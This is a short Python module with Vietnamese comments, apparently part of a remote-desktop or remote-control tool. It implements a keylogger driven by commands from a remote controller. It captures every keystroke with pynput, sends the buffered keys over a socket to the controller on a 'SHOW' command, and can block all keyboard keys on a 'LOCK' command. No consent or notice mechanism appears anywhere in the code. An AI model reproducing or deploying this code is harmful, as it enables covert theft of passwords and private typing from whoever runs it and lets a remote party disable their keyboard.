import threading
import keyboard
from pynput.keyboard import Listener
from RD_Constant import BUFFERSIZE, FORMAT

#Lưu thông tin các phím đã nhấn vào biến buffer
def keylogger(key):
    global buffer, cmd_flag
    if cmd_flag == 4:
        return False
    if cmd_flag == 1:
        tmp = str(key)
        if tmp == "Key.space":
            tmp = " "
        elif tmp == '"\'"':
            tmp = "'"
        else:
            tmp = tmp.replace("'", "")
        buffer += str(tmp)
    return

#Gửi thông tin các phím đã ấn sang client
def show(main_connect):
    global buffer
    main_connect.sendall(buffer.encode(FORMAT))
    buffer = ""
    return

#Lắng nghe các phím được bấm
def listen():
    with Listener(on_press=keylogger) as listener:
        listener.join()
    return

#Khóa bàn phím
def lock():
    global lock_flag
    if lock_flag == 0:
        for i in range(150):
            keyboard.block_key(i)
        lock_flag = 1
    else:
        for i in range(150):
            keyboard.unblock_key(i)
        lock_flag = 0
    return

def keylog(main_connect):
    global buffer, cmd_flag, lock_flag, bind_flag
    lock_flag = 0
    bind_flag = 0
    listener_thread = threading.Thread(target=listen)
    listener_thread.daemon = True
    listener_thread.start()
    cmd_flag = 0
    buffer = ""
    msg = ""
    while True:
        msg = main_connect.recv(BUFFERSIZE).decode(FORMAT)
        if "BIND" in msg:
            if bind_flag == 0:
                cmd_flag = 1
                bind_flag = 1
            else:
                cmd_flag = 2
                bind_flag = 0
        elif "SHOW" in msg:
            show(main_connect)
        elif "LOCK" in msg:
            lock()
        elif "STOP" in msg:
            cmd_flag = 4
            return
    return